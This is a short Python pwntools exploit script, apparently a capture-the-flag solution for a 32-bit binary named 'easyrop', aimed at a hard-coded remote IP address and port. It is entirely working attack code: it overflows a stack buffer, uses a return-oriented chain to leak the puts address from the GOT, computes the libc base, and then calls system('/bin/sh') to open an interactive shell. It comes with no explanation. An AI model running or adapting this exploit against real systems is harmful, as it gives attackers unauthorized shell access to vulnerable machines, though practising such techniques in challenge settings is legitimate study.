from pwn import *

local=0
debug=0
atta=0
pc='./easyrop'
remote_addr="210.28.132.84"
remote_port=29938
elf=ELF(pc)

libc=ELF('./libc-2.23.so') 
if local==1:
    p = process(pc)

else:
    p=remote(remote_addr,remote_port)

if debug:
    context.log_level=True

if atta:
    gdb.attach(p)

def hack():
    p.recvline()    
    puts_plt=0x08048400
    puts_got=0x0804A014
    main=0x80485c8
    payload=p32(puts_plt)+p32(main)+p32(puts_got)
    p.sendline('A'*64+p8(0x53)+payload)
    puts_addr=u32(p.recv(4))
    print(hex(puts_addr))
    p.recvline()
    p.recvline()
    libc.address=puts_addr-libc.symbols['puts']
    system_addr=libc.symbols['system']
    sh_addr=libc.search('/bin/sh').next()
    payload=p32(system_addr)+p32(0xdeadbeef)+p32(sh_addr)
    p.sendline('A'*64+p8(0x53)+payload)
    p.interactive()

hack()
